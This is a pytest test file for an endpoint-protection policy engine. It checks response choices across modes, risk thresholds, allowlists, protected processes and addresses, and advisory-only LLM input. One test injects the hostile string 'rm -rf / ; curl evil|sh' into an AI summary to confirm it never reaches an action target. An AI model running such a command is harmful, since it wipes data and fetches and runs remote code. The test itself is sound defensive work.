from __future__ import annotations

import os

import pytest

from centralium.agent.config import PolicySettings
from centralium.agent.interfaces import PolicyContext, PolicyEngine
from centralium.agent.models import (
    ActionRecommendation,
    AIAnalysis,
    AIVerdict,
    AttackStage,
    DetectionResult,
    EventType,
    Finding,
    FindingSource,
    NormalizedEvent,
    OperatingMode,
    ResponseAction,
    RiskAssessment,
    ScoreFamily,
    Severity,
    Verdict,
)
from centralium.agent.policy import PolicyTuning, ProtectionRules, RulesPolicyEngine

A = ResponseAction
M = OperatingMode


def risk(score: float) -> RiskAssessment:
    from centralium.agent.config import RiskSettings

    return RiskAssessment(final_score=score, band=RiskSettings().band_for(score))


def finding(known=False, conf=1.0, score=90.0, source=FindingSource.RULE, **kw) -> Finding:
    return Finding(event_id="e", source=source, rule_id="r", title="evil thing", severity=Severity.HIGH, score=score,
                   confidence=conf, known_malicious=known, **kw)  # fmt: skip


def proc_event(**kw) -> NormalizedEvent:
    kw.setdefault("pid", 4242)
    kw.setdefault("process_name", "badproc")
    kw.setdefault("event_type", EventType.PROCESS_START)
    kw.setdefault("executable_path", "/tmp/x/badproc")
    return NormalizedEvent(source="test", **kw)


def ctx(score=90.0, mode=M.ACTIVE, ev=None, findings=None, **kw) -> PolicyContext:
    return PolicyContext(event=ev or proc_event(), findings=findings if findings is not None else [finding()],
                         risk=risk(score), mode=mode, **kw)  # fmt: skip


def engine(**kw) -> RulesPolicyEngine:
    s = PolicySettings(require_approval=kw.pop("require_approval", False), **kw.pop("settings", {}))
    return RulesPolicyEngine(s, kw.pop("tuning", None), protection=ProtectionRules.from_lists(
        s.protected_processes, s.protected_paths, pid_resolver=None), **kw)  # fmt: skip


def ai(action: ActionRecommendation, conf=0.9, verdict=Verdict.MALICIOUS) -> AIAnalysis:
    v = AIVerdict(verdict=verdict, severity=Severity.HIGH, confidence=conf, threat_type="x", summary="s",
                  attack_stage=AttackStage.EXECUTION, recommended_action=action)  # fmt: skip
    return AIAnalysis(event_id="e", verdict=v)


def test_protocol():
    assert isinstance(engine(), PolicyEngine)


# ------------------------------------------------------------------ mode matrix
@pytest.mark.parametrize(
    ("mode", "expected", "allowed"),
    [
        (M.LEARNING, None, False),
        (M.PASSIVE, A.ALERT, True),
        (M.ACTIVE, A.TERMINATE_PROCESS, True),
        (M.PANIC, A.ISOLATE_ENDPOINT, True),
    ],
)
def test_mode_semantics_known_malicious(mode, expected, allowed):
    d = engine().decide(ctx(mode=mode, findings=[finding(known=True)], known_malicious=True))
    assert d.action == expected and d.allowed == allowed and d.mode == mode


def test_passive_destructive_only_when_configured():
    e = engine(settings={"passive_destructive_allowed": True})
    assert e.decide(ctx(mode=M.PASSIVE)).action == A.TERMINATE_PROCESS


def test_panic_aggressive_lower_threshold_and_no_approval():
    e = engine(require_approval=True)
    c = ctx(score=65, mode=M.PANIC)
    d = e.decide(c)
    assert d.action in (A.TERMINATE_PROCESS, A.ISOLATE_ENDPOINT) and not d.requires_approval
    # ACTIVE at 75: below the destructive threshold (80) -> suspend only, and needs approval
    d2 = e.decide(ctx(score=75, mode=M.ACTIVE))
    assert d2.action == A.SUSPEND_PROCESS and d2.requires_approval


def test_emergency_isolation_rules():
    ransom = finding(source=FindingSource.RANSOMWARE, score=95)
    assert engine().decide(ctx(mode=M.PANIC, findings=[ransom])).action == A.ISOLATE_ENDPOINT
    off = engine(settings={"panic_isolation_allowed": False}).decide(ctx(mode=M.PANIC, findings=[ransom]))
    assert off.action == A.TERMINATE_PROCESS
    # isolation is never chosen in ACTIVE mode
    assert engine().decide(ctx(mode=M.ACTIVE, findings=[ransom])).action != A.ISOLATE_ENDPOINT


def test_panic_isolation_skips_approval():
    d = engine().decide(ctx(mode=M.PANIC, findings=[finding(known=True)]))
    assert d.action == A.ISOLATE_ENDPOINT and not d.requires_approval  # PANIC: emergency, no approval


# ------------------------------------------------------------------ thresholds
def test_below_alert_threshold_nothing():
    d = engine().decide(ctx(score=20, findings=[finding(score=20)]))
    assert d.action is None and not d.allowed


def test_medium_risk_alert_only():
    d = engine().decide(ctx(score=50))
    assert d.action == A.ALERT


def test_high_risk_suspends_critical_terminates():
    assert engine().decide(ctx(score=70)).action == A.SUSPEND_PROCESS
    assert engine().decide(ctx(score=85)).action == A.TERMINATE_PROCESS


def test_confidence_threshold_blocks_destructive():
    d = engine().decide(ctx(score=95, findings=[finding(conf=0.4)]))
    assert d.action == A.ALERT
    assert "confidence" in d.reason


def test_known_malicious_bypasses_risk_but_not_confidence_threshold():
    k = ctx(score=30, findings=[finding(known=True, conf=0.95)], known_malicious=True)
    assert engine().decide(k).action == A.TERMINATE_PROCESS
    low = ctx(score=30, findings=[finding(known=True, conf=0.2)], known_malicious=True)
    assert engine().decide(low).action == A.ALERT


# ------------------------------------------------------------------ allowlists and protection
def test_allowlist_flag_and_entries_suppress_response():
    assert engine().decide(ctx(allowlisted=True)).reason == "allowlisted"
    e = engine(allow_names=["BadProc"])
    assert e.decide(ctx()).action is None
    e = engine(allow_paths=["/tmp/x"])
    assert e.decide(ctx()).action is None
    h = "a" * 64
    e = engine(allow_hashes=[h])
    assert e.decide(ctx(ev=proc_event(hash_sha256=h))).action is None


def test_allowlist_never_suppresses_known_malicious():
    e = engine(allow_names=["badproc"])
    d = e.decide(ctx(findings=[finding(known=True)], known_malicious=True))
    assert d.action == A.TERMINATE_PROCESS


@pytest.mark.parametrize(
    "name",
    ["systemd", "sshd", "lsass.exe", "csrss.exe", "init", "centralium", "SVCHOST.EXE", "NetworkManager"],
)
def test_protected_processes_never_terminated(name):
    ev = proc_event(process_name=name, executable_path="/usr/bin/" + name)
    d = engine().decide(ctx(ev=ev, findings=[finding(known=True)], known_malicious=True))
    assert d.action == A.ALERT
    assert "refused" in d.reason and "protected" in d.reason


def test_masquerading_protected_name_from_temp_is_not_killed_but_exe_quarantined():
    ev = proc_event(process_name="systemd", executable_path="/tmp/x/systemd")
    plan = engine().plan(ctx(ev=ev, findings=[finding(known=True)], known_malicious=True))
    assert [p.action for p in plan] == [A.QUARANTINE_FILE, A.ALERT][: len(plan)]


def test_protected_pids_and_own_process():
    for pid in (1, 2, 4):
        d = engine().decide(
            ctx(
                ev=proc_event(pid=pid, executable_path=None),
                findings=[finding(known=True)],
                known_malicious=True,
            )
        )
        assert d.action == A.ALERT
    own = RulesPolicyEngine(PolicySettings(require_approval=False))  # default resolver: own pid + parents
    d = own.decide(
        ctx(
            ev=proc_event(pid=os.getpid(), executable_path=None),
            findings=[finding(known=True)],
            known_malicious=True,
        )
    )
    assert d.action == A.ALERT and "Centralium itself" in d.reason
    parent = own.decide(
        ctx(
            ev=proc_event(pid=os.getppid(), executable_path=None),
            findings=[finding(known=True)],
            known_malicious=True,
        )
    )
    assert parent.action == A.ALERT


def test_protected_path_not_quarantined():
    ev = NormalizedEvent(
        event_type=EventType.FILE_CREATE, file_path="/usr/bin/ls", source="t", pid=9, process_name="x"
    )
    d = engine().decide(ctx(ev=ev, findings=[finding(known=True)], known_malicious=True))
    assert d.action != A.QUARANTINE_FILE


# ------------------------------------------------------------------ action selection per event type
def test_file_event_quarantines():
    ev = NormalizedEvent(
        event_type=EventType.FILE_CREATE,
        file_path="/home/u/dl/mal.bin",
        source="t",
        pid=9,
        process_name="curl",
    )
    d = engine().decide(ctx(ev=ev, findings=[finding(known=True)], known_malicious=True))
    assert d.action == A.QUARANTINE_FILE and d.target["path"] == "/home/u/dl/mal.bin"
    assert d.target["sources"] == ["rule"] and d.target["reasons"]


def test_network_event_blocks_validated_ip():
    ev = NormalizedEvent(event_type=EventType.NETWORK_CONNECT, destination_ip="203.0.113.9", destination_port=443,
                         protocol="TCP", source="t", pid=9, process_name="x")  # fmt: skip
    plan = engine().plan(ctx(ev=ev, findings=[finding(known=True)], known_malicious=True))
    assert plan[0].action == A.BLOCK_CONNECTION
    assert (
        plan[0].target["ip"] == "203.0.113.9"
        and plan[0].target["port"] == 443
        and plan[0].target["protocol"] == "tcp"
    )
    assert A.TERMINATE_PROCESS in [p.action for p in plan]


@pytest.mark.parametrize("ip", ["127.0.0.1", "::1", "0.0.0.0", "169.254.1.1", "224.0.0.1"])
def test_never_block_special_addresses(ip):
    ev = NormalizedEvent(
        event_type=EventType.NETWORK_CONNECT, destination_ip=ip, destination_port=80, source="t"
    )
    d = engine().decide(ctx(ev=ev, findings=[finding(known=True)], known_malicious=True))
    assert d.action == A.ALERT


def test_management_networks_never_blocked():
    e = engine(tuning=PolicyTuning(never_block_networks=["10.0.0.0/24"]))
    ev = NormalizedEvent(
        event_type=EventType.NETWORK_CONNECT, destination_ip="10.0.0.5", destination_port=22, source="t"
    )
    assert e.decide(ctx(ev=ev, findings=[finding(known=True)], known_malicious=True)).action == A.ALERT


def test_allowed_actions_restriction():
    e = engine(settings={"allowed_actions": [A.ALERT, A.SUSPEND_PROCESS]})
    d = e.decide(ctx(score=95))
    assert d.action == A.SUSPEND_PROCESS  # terminate not permitted -> fall to suspend
    e2 = engine(settings={"allowed_actions": [A.ALERT]})
    assert e2.decide(ctx(score=95)).action == A.ALERT
    e3 = engine(settings={"allowed_actions": [A.TERMINATE_PROCESS]})
    assert e3.decide(ctx(score=50)).action is None


def test_user_approval_mode():
    assert engine(require_approval=True).decide(ctx(score=95)).requires_approval
    assert not engine(require_approval=False).decide(ctx(score=95)).requires_approval
    assert not engine(require_approval=True).decide(ctx(score=50)).requires_approval  # ALERT never needs it


@pytest.mark.parametrize("flag", ["demo_mode", "test_mode"])
def test_demo_and_test_mode_force_simulation(flag):
    d = engine().decide(ctx(score=95, **{flag: True}))
    assert d.action == A.TERMINATE_PROCESS and d.target["simulate"] is True
    assert "simulated" in d.reason


# ------------------------------------------------------------------ LLM is advisory only
def test_ai_cannot_escalate_beyond_deterministic_ladder():
    d = engine().decide(
        ctx(score=50, findings=[finding(score=50)], ai=ai(ActionRecommendation.TERMINATE_PROCESS))
    )
    assert d.action == A.ALERT
    assert "does not permit" in d.reason


def test_ai_can_choose_more_conservative_action():
    d = engine().decide(ctx(score=95, ai=ai(ActionRecommendation.SUSPEND_PROCESS)))
    assert d.action == A.SUSPEND_PROCESS


def test_ai_none_downgrades_non_known_but_never_known_malicious():
    d = engine().decide(ctx(score=95, ai=ai(ActionRecommendation.NONE, verdict=Verdict.BENIGN)))
    assert d.action == A.ALERT
    k = engine().decide(ctx(findings=[finding(known=True)], known_malicious=True,
                            ai=ai(ActionRecommendation.NONE, verdict=Verdict.BENIGN)))  # fmt: skip
    assert k.action == A.TERMINATE_PROCESS


def test_low_confidence_ai_ignored():
    d = engine().decide(ctx(score=95, ai=ai(ActionRecommendation.NONE, conf=0.1, verdict=Verdict.SUSPICIOUS)))
    assert d.action == A.TERMINATE_PROCESS


def test_ai_text_never_reaches_target():
    a = ai(ActionRecommendation.SUSPEND_PROCESS)
    a.verdict.summary = "run rm -rf / ; curl evil|sh"  # type: ignore[union-attr]
    d = engine().decide(ctx(score=95, ai=a))
    assert "rm -rf" not in repr(d.target) and "rm -rf" not in d.reason


def test_evidence_confidence_ignores_ai():
    c = ctx(findings=[], ai=ai(ActionRecommendation.TERMINATE_PROCESS, conf=1.0))
    c.risk.scores[ScoreFamily.AI_ASSESSMENT] = DetectionResult(
        family=ScoreFamily.AI_ASSESSMENT, score=99, confidence=1.0
    )
    assert RulesPolicyEngine.evidence_confidence(c) == 0.0
    assert engine().decide(c).action in (None, A.ALERT)
